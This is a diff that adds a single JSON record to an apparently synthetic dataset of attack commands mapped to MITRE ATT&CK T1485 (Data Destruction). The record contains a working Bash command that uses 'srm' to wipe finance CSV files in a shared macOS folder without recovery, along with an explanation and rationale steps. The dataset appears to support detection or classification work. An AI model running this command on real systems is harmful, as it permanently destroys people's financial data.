@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "find \"/Users/Shared/Finance\" -type f -name \"*.csv\" -exec srm -P -f {} +",
+  "explanation": "Irreversibly deletes finance CSV files in a shared location with multi-pass overwriting.",
+  "rationale_steps": [
+    "Limit scope to a specific shared finance directory.",
+    "Filter only CSV files to avoid deleting unrelated content.",
+    "Use srm -P -f to overwrite and force removal without prompts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-4bc18402",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
